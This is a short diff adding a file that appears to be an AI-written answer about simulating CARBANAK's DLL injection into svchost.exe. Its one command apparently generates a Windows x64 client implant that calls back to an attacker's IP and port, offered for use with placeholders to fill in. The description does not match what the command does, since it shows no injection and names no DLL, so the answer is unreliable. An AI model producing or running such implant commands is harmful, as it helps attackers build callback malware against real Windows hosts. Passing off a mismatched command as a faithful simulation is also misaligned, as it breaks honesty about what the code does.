@@ -1,0 +1,6 @@
+Here are the command lines that simulate the CARBANAK DLL injection into the svchost.exe process:
+
+Command: `gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport`
+Replace `<ip>` and `<port>` with the actual IP address and port number used by the attacker.
+
+Note that I did not include any specific file names, as the documentation does not provide information on which DLL is being injected.
